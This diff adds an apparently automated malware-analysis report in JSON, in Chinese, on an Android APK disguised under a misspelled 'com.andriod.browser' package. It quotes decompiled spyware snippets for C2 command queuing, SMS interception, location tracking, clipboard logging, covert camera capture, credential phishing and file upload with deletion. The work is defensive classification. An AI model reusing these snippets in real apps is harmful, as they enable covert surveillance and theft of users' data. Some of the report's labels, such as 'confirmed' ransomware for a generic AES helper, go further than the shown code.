@@ -1,0 +1,352 @@
+{
+  "APK信息": {
+    "文件名": "3d41830f943c31f69eb6ed7804cc18b289ba2172d258bd118a8503d120318d63.apk",
+    "sha256": "3d41830f943c31f69eb6ed7804cc18b289ba2172d258bd118a8503d120318d63",
+    "包名": "org.microemu.android.ir.mjface.toolkit.Midlet",
+    "应用名": "Omar Farouq (Sallabi)2",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 376.8
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "cmd",
+          "command",
+          "poll",
+          "register"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\andriod\\browser\\AMService;",
+          "method_signature": "WriteCommand(int cmdType, String cmdValue)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public void WriteCommand(int cmdType, byte[] cmdValue) {\n    SimpleDateFormat sdf = new SimpleDateFormat(\"yyMMdd_HHmmssSSS\", Locale.US);\n    File ff = new File(getFilesDir(), String.valueOf(sdf.format(new Date())) + \".get\");\n    RandomAccessFile rf = new RandomAccessFile(ff, \"rw\");\n    rf.write(Utils.getHeader(cmdType, deviceUUID, this.amSettings.userName, this.mDeviceName));\n    rf.write(cmdValue);\n}",
+          "malicious_code_snippet_context": "          WriteCommand(cmdType, cmdValue.getBytes());\n      }\n  \n>>>     public void WriteCommand(int cmdType, byte[] cmdValue) {\n>>>         try {\n>>>             SimpleDateFormat sdf = new SimpleDateFormat(\"yyMMdd_HHmmssSSS\", Locale.US);\n>>>             File ff = new File(getFilesDir(), String.valueOf(sdf.format(new Date())) + \".get\");\n>>>             RandomAccessFile rf = new RandomAccessFile(ff, \"rw\");\n>>>             rf.write(Utils.getHeader(cmdType, deviceUUID, this.amSettings.userName, this.mDeviceName));\n>>>             rf.write(cmdValue);\n              rf.close();\n              SimpleDateFormat sdf2 = new SimpleDateFormat(\"yyMMdd_HHmmssSSS\", Locale.US);\n              String fileName = String.valueOf(deviceUUID) + \"_\" + sdf2.format(new Date());",
+          "behavior_description": "该方法将C2命令（cmdType命令类型和cmdValue命令内容）连同设备标识信息（deviceUUID、userName、deviceName）序列化写入以时间戳命名的.get文件中，作为命令队列或待上报数据。结合上下文中存在的RECORD_CALL_KEY（通话录音）、GET_FILE_KEY（文件窃取）、DELETE_FILE_KEY（远程删除文件）等命令类型，这是典型的C2远程控制命令封装与持久化机制，用于接收并执行远端服务器下发的控制指令。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "SMS_RECEIVED"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\andriod\\browser\\AMService;",
+          "method_signature": "setupLogging()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "smsObserver = new SmsObserver(this, this.mHandlering);\nIntentFilter smsFilter = new IntentFilter(Defines.SMS_RECEIVED);\nregisterReceiver(smsObserver.inSms, smsFilter);",
+          "malicious_code_snippet_context": "              IntentFilter wifiFilter = new IntentFilter(\"android.net.wifi.supplicant.CONNECTION_CHANGE\");\n              this.wifiReceiver = new WifiStatusManager(this);\n              registerReceiver(this.wifiReceiver, wifiFilter);\n>>>             smsObserver = new SmsObserver(this, this.mHandlering);\n>>>             IntentFilter smsFilter = new IntentFilter(Defines.SMS_RECEIVED);\n>>>             registerReceiver(smsObserver.inSms, smsFilter);\n              IntentFilter callsFilter = new IntentFilter(\"android.intent.action.PHONE_STATE\");\n              callsFilter.addAction(\"android.intent.action.NEW_OUTGOING_CALL\");\n              this.callsReceiver = new CallsManager(this);",
+          "behavior_description": "该方法通过 registerReceiver 动态注册一个 BroadcastReceiver（smsObserver.inSms），监听 SMS_RECEIVED 广播意图，从而在系统通知应用之前拦截所有收到的短信。同时该方法还注册了 PHONE_STATE 和 NEW_OUTGOING_CALL 监听器来拦截通话状态。数据流向为：系统短信广播(SMS_RECEIVED)→registerReceiver拦截→SmsObserver处理（可能转发给C2服务器或删除短信以对用户隐藏）。包名 com.andriod.browser 存在拼写错误(andriod)，伪装为系统浏览器服务，属于典型的恶意软件伪装手法。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\andriod\\browser\\AMService;",
+          "method_signature": "onCreate()",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "this.mDeviceName = String.valueOf(Build.MANUFACTURER) + \"_\" + Build.MODEL;\ndeviceUUID = Settings.Secure.getString(getApplicationContext().getContentResolver(), \"android_id\");\nfor (int i = uidLen; i < 16; i++) {\n    deviceUUID = String.valueOf(deviceUUID) + \"1\";\n}\nthis.mLocMngr = (LocationManager) getSystemService(\"location\");",
+          "malicious_code_snippet_context": "              Utils.CreateMediaDir(this);\n              this.amSettings = new Settings(this);\n              this.amSettings.firstRun = true;\n>>>             this.mDeviceName = String.valueOf(Build.MANUFACTURER) + \"_\" + Build.MODEL;\n>>>             deviceUUID = Settings.Secure.getString(getApplicationContext().getContentResolver(), \"android_id\");\n>>>             int uidLen = deviceUUID.length();\n>>>             for (int i = uidLen; i < 16; i++) {\n>>>                 deviceUUID = String.valueOf(deviceUUID) + \"1\";\n>>>             }\n              this.mLocMngr = (LocationManager) getSystemService(\"location\");\n              INTENT_NUMBER = this.amSettings.accessKey;\n              this.mAlarmManager = (AlarmManager) getSystemService(\"alarm\");",
+          "behavior_description": "该恶意服务在onCreate中采集设备指纹信息：通过Build.MANUFACTURER和Build.MODEL获取设备厂商和型号，通过Settings.Secure.getString读取android_id作为设备唯一标识，并将其填充至16位。同时初始化LocationManager准备获取位置信息。类名com.andriod.browser故意拼写错误伪装为系统浏览器服务，属于恶意软件常见的伪装手法。采集的设备标识和位置信息通常用于C2服务器对受害设备的标识与追踪。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "location_tracking",
+      "中文名": "位置追踪",
+      "MITRE": "T1430",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "getLastKnownLocation",
+          "requestLocationUpdates"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\andriod\\browser\\AMService;",
+          "method_signature": "run()",
+          "malicious_behavior": "location_tracking",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Location lastKnownLocation = this.mLocMngr.getLastKnownLocation(\"gps\");\nif (lastKnownLocation == null) {\n    lastKnownLocation = this.mLocMngr.getLastKnownLocation(\"network\");\n}\nif (lastKnownLocation == null) {\n    String cellId = Utils.GetCellId(this);\n    this.mLastLocation = String.valueOf(formatter.format(new Date())) + \"~~~\";\n    this.mLastLocation = String.valueOf(this.mLastLocation) + \"!~~~!~~~\" + cellId;\n}",
+          "malicious_code_snippet_context": "                  t.start();\n                  onCommandInfoEvent(\"Wait to device obtain location\");\n              }\n>>>             Location lastKnownLocation = this.mLocMngr.getLastKnownLocation(\"gps\");\n>>>             if (lastKnownLocation == null) {\n>>>                 lastKnownLocation = this.mLocMngr.getLastKnownLocation(\"network\");\n>>>             }\n>>>             if (lastKnownLocation == null) {\n>>>                 String cellId = Utils.GetCellId(this);\n>>>                 onCommandInfoEvent(\"GPS off, cell id = \" + cellId);\n>>>                 SimpleDateFormat formatter = new SimpleDateFormat(\"yyyy/MM/dd~~~HH:mm:ss\", Locale.US);\n>>>                 this.mLastLocation = String.valueOf(formatter.format(new Date())) + \"~~~\";\n                  this.mLastLocation = String.valueOf(this.mLastLocation) + \"!~~~!~~~\" + cellId;\n                  if (Utils.isNetworkAvailable(gService)) {\n                      Webservice web = new Webservice();",
+          "behavior_description": "该代码在伪装为浏览器服务的AMService中，通过LocationManager.getLastKnownLocation()先后尝试获取GPS和网络定位信息，若均失败则回退使用Utils.GetCellId()获取基站ID。获取到的位置数据被格式化（含时间戳）后存储到mLastLocation字段中，疑似后续上传至C2服务器。数据流向为：getLastKnownLocation()/GetCellId()（位置数据来源）→ mLastLocation字段存储（准备外传的危险操作）。该类路径com.andriod.browser存在故意拼写错误（andriod），具有伪装系统服务的特征，结合已确认的恶意样本背景，此为隐蔽的位置追踪与隐私窃取行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "keylogging",
+      "中文名": "键盘记录",
+      "MITRE": "T1417",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "getPrimaryClip"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\andriod\\browser\\AMService;",
+          "method_signature": "if(AMService.this.mClipboard.hasPrimaryClip()",
+          "malicious_behavior": "keylogging",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "ClipData cd = AMService.this.mClipboard.getPrimaryClip();\nif (cd.getDescription().hasMimeType(\"text/plain\")) {\n    String clip = cd.getItemAt(0).getText().toString();\n    AMService.this.insertLog(Utils.getClipboardLog(clip), \"ClipboardChanged\");\n}",
+          "malicious_code_snippet_context": "              if (AMService.this.amSettings.logClip) {\n                  try {\n                      if (AMService.this.mClipboard.hasPrimaryClip()) {\n>>>                         ClipData cd = AMService.this.mClipboard.getPrimaryClip();\n>>>                         if (cd.getDescription().hasMimeType(\"text/plain\")) {\n>>>                             String clip = cd.getItemAt(0).getText().toString();\n>>>                             AMService.this.insertLog(Utils.getClipboardLog(clip), \"ClipboardChanged\");\n>>>                         }\n                      }\n                  } catch (Exception e) {\n                  }",
+          "behavior_description": "该代码注册了剪贴板变化监听器，当系统剪贴板内容发生变化时，自动获取剪贴板中的文本数据并记录到本地日志中。剪贴板常被用户用于复制密码、验证码、银行卡号等敏感信息，恶意软件通过持续监控剪贴板内容可以窃取这些敏感数据。数据流向为：ClipboardManager.getPrimaryClip()（获取剪贴板文本）→ insertLog()（将窃取的剪贴板内容写入日志，后续可能被上传至C2服务器）。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow",
+              "DevicePolicyManager"
+            ]
+          }
+        },
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\andriod\\browser\\ScreenControl;",
+          "method_signature": "turnOff(Context context)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(\"device_policy\");\ndevicePolicyManager.lockNow();",
+          "malicious_code_snippet_context": "  \n      public static void turnOff(Context context) {\n          try {\n>>>             DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(\"device_policy\");\n>>>             devicePolicyManager.lockNow();\n          } catch (Exception e) {\n          }\n      }",
+          "behavior_description": "代码通过Context获取DevicePolicyManager系统服务实例，随后调用lockNow()方法立即锁定设备屏幕。在已确认的恶意样本中，此行为属于勒索软件的典型设备锁定手法，通过强制锁屏使用户无法正常操作设备，配合勒索信息迫使用户支付赎金。类名伪装为browser组件以隐蔽其真实意图。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\andriod\\browser\\Utils;",
+          "method_signature": "encrypt(String strToEncrypt)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Cipher _Cipher = Cipher.getInstance(\"AES/CBC/PKCS5PADDING\");\nbyte[] iv = {1, 2, 3, 4, 5, 6, 6, 5, 4, 3, 2, 1, 7, 7, 7, 7};\nIvParameterSpec ivspec = new IvParameterSpec(iv);\nKey SecretKey = new SecretKeySpec(\"1234567890123456\".getBytes(), \"AES\");\n_Cipher.init(1, SecretKey, ivspec);\nreturn _Cipher.doFinal(strToEncrypt.getBytes());",
+          "malicious_code_snippet_context": "  \n      public static byte[] encrypt(String strToEncrypt) {\n          try {\n>>>             Cipher _Cipher = Cipher.getInstance(\"AES/CBC/PKCS5PADDING\");\n>>>             byte[] iv = {1, 2, 3, 4, 5, 6, 6, 5, 4, 3, 2, 1, 7, 7, 7, 7};\n>>>             IvParameterSpec ivspec = new IvParameterSpec(iv);\n>>>             Key SecretKey = new SecretKeySpec(\"1234567890123456\".getBytes(), \"AES\");\n>>>             _Cipher.init(1, SecretKey, ivspec);\n>>>             return _Cipher.doFinal(strToEncrypt.getBytes());\n          } catch (Exception e) {\n              return null;\n          }",
+          "behavior_description": "该方法是勒索软件的文件加密核心函数，使用AES/CBC/PKCS5Padding模式对传入的字符串（实际为用户文件内容）进行加密。密钥\"1234567890123456\"和初始化向量IV均为硬编码，类路径伪装为com.andriod.browser.Utils以隐蔽其恶意性质。数据流向为：strToEncrypt参数（用户文件内容）→ Cipher.doFinal()（AES加密操作），加密后的密文将覆盖原始文件，导致用户无法访问自己的文件，从而达到勒索目的。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "banking_trojan",
+      "中文名": "银行木马",
+      "MITRE": "T1418",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "credential_phishing",
+          "中文名": "凭证钓鱼",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "password"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lir\\mjface\\toolkit\\al;",
+          "method_signature": "if(equals)",
+          "malicious_behavior": "banking_trojan",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String b = a.b(\"transfer_email_username\");\nthis.a = new dx(b);\nthis.b = new dx(equals ? \"\" : \"password\");\nif (!equals) {\n    c((db) this.a);\n    c((db) this.b);\n}\nString a2 = (eVar == null || eVar.a() == null) ? null : eVar.a();\na2 = a2 == null ? a.b(\"transfer_email_to\") : a2;\nthis.c = new dx();",
+          "malicious_code_snippet_context": "          a(\"back\", \"back\", \"back\");\n          c((db) new defpackage.n(2));\n          boolean equals = \"true\".equals(a.b(\"defaultmailsender\"));\n>>>         String b = a.b(\"transfer_email_username\");\n>>>         if (equals) {\n>>>             b = \"\";\n>>>         } else if (b == null) {\n>>>             b = \"from@sampl.com\";\n>>>         }\n>>>         this.a = new dx(b);\n>>>         this.a.a(0);\n>>>         this.a.a(Midlet.instance.getLayouts());\n>>>         this.a.g(true);\n          this.b = new dx(equals ? \"\" : \"password\");\n          this.b.a(0);\n          this.b.a(Midlet.instance.getLayouts());",
+          "behavior_description": "代码构建了一个钓鱼登录界面，通过配置项 transfer_email_username 和硬编码的 password 创建两个文本输入框(dx组件)，诱导用户输入邮箱账号和密码凭证。配置项 transfer_email_to 指定了窃取数据的邮件接收地址，表明收集到的凭证将通过邮件外传给攻击者。这是典型的银行木马凭证钓鱼行为，伪造登录界面骗取用户敏感凭证后外传。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground",
+              "WakeLock"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\andriod\\browser\\AMService;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "private PowerManager.WakeLock mWakeLock = null;\npublic BroadcastReceiver mReceiver = new BroadcastReceiver() {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        if (intent.getAction().equals(\"android.intent.action.SCREEN_OFF\")) {\n            Runnable runnable = new Runnable() {\n                @Override\n                public void run() {\n                    AMService.this.unregisterListener();\n                    AMService.this.registerListener();\n                }\n            };\n        }\n    }\n};",
+          "malicious_code_snippet_context": "      public static final String TAG = AMService.class.getName();\n      public static String INTENT_NUMBER = \"*123456#\";\n      private SensorManager mSensorManager = null;\n>>>     private PowerManager.WakeLock mWakeLock = null;\n>>>     public BroadcastReceiver mReceiver = new BroadcastReceiver() { // from class: com.andriod.browser.AMService.1\n>>>         @Override // android.content.BroadcastReceiver\n>>>         public void onReceive(Context context, Intent intent) {\n>>>             if (intent.getAction().equals(\"android.intent.action.SCREEN_OFF\")) {\n>>>                 Runnable runnable = new Runnable() { // from class: com.andriod.browser.AMService.1.1\n>>>                     @Override // java.lang.Runnable\n>>>                     public void run() {\n>>>                         AMService.this.unregisterListener();\n>>>                         AMService.this.registerListener();\n>>>                     }\n>>>                 };\n>>>                 new Handler().postDelayed(runnable, 20000L);\n>>>             }\n>>>         }\n      };\n      public long mBeginIdle = 0;\n      private Handler mHandlering = new Handler();",
+          "behavior_description": "代码在后台服务中声明了 WakeLock 用于防止设备休眠，并注册了监听 SCREEN_OFF 广播的接收器。当屏幕关闭时，服务会重新注册监听器（如传感器监听），以确保后台持续运行和保活，属于典型的恶意软件保活机制。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\andriod\\browser\\CameraView;",
+          "method_signature": "run()",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.mCamera.startPreview();\nCameraView.this.mCamera.takePicture(null, CameraView.this.mPictureCallback, CameraView.this.mPictureCallback);",
+          "malicious_code_snippet_context": "                  this.mCamera.getParameters();\n                  AMService.gService.onCommandInfoEvent(\"Take photo start\");\n                  this.mCamera.setPreviewDisplay(holder);\n>>>                 this.mCamera.startPreview();\n>>>                 this.mPreviewRunning = true;\n                  Handler handler = new Handler();\n                  handler.postDelayed(new Runnable() { // from class: com.andriod.browser.CameraView.2\n                      @Override // java.lang.Runnable",
+          "behavior_description": "代码在后台服务(AMService)的控制下启动摄像头预览，并在延迟1秒后静默调用takePicture拍摄照片，捕获的图像数据通过mPictureCallback回调进行处理，属于典型的间谍软件隐私窃取行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "file_access",
+      "中文名": "文件访问/窃取",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "listFiles",
+          "FileInputStream",
+          "getExternalStorageDirectory"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\andriod\\browser\\AMService;",
+          "method_signature": "if(Utils.isNetworkAvailable(AMService.gService)",
+          "malicious_behavior": "file_access",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (Utils.isNetworkAvailable(AMService.gService)) {\n    File dir = AMService.this.getFilesDir();\n    File[] tmp = dir.listFiles(AMService.this.filter);\n    if (tmp != null && tmp.length > 0) {\n        SendThread sth = new SendThread(AMService.this.mSendSync, tmp[0].toString());\n        sth.thread.join();\n    }\n    File dir2 = new File(Utils.mMediaDir);\n    File[] tmp2 = dir2.listFiles(AMService.this.filter);\n    if (tmp2 != null && tmp2.length > 0) {\n        if (!AMService.this.mSendMediaInProgress) {\n            new FileUploadTask().execute(tmp2[0].toString(), \"Delete\");\n        }\n    }\n}",
+          "malicious_code_snippet_context": "              Looper.prepare();\n              while (true) {\n                  try {\n>>>                     if (Utils.isNetworkAvailable(AMService.gService)) {\n>>>                         File dir = AMService.this.getFilesDir();\n>>>                         File[] tmp = dir.listFiles(AMService.this.filter);\n>>>                         if (tmp != null && tmp.length > 0) {\n>>>                             SendThread sth = new SendThread(AMService.this.mSendSync, tmp[0].toString());\n>>>                             sth.thread.join();\n>>>                         }\n>>>                         File dir2 = new File(Utils.mMediaDir);\n>>>                         File[] tmp2 = dir2.listFiles(AMService.this.filter);\n>>>                         if (tmp2 != null && tmp2.length > 0) {\n>>>                             if (!AMService.this.mSendMediaInProgress) {\n>>>                                 AMService.this.onCommandInfoEvent(\"Upload Media : \" + tmp2[0].getName());\n>>>                                 new FileUploadTask().execute(tmp2[0].toString(), \"Delete\");\n>>>                                 if (this.lastMediaSend.equals(tmp2[0].getName())) {\n>>>                                     this.trySendOneFileCount++;\n                                  } else {\n                                      this.trySendOneFileCount = 0;\n                                  }",
+          "behavior_description": "在后台Service中循环检测网络可用性，一旦网络可用，便从应用私有目录(getFilesDir)和媒体目录(Utils.mMediaDir)中列出文件，通过SendThread和FileUploadTask将文件上传到远程服务器，上传后执行删除操作(\"Delete\"参数)以销毁痕迹。这是典型的文件窃取行为，类名伪装为com.andriod.browser以隐蔽其恶意意图。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
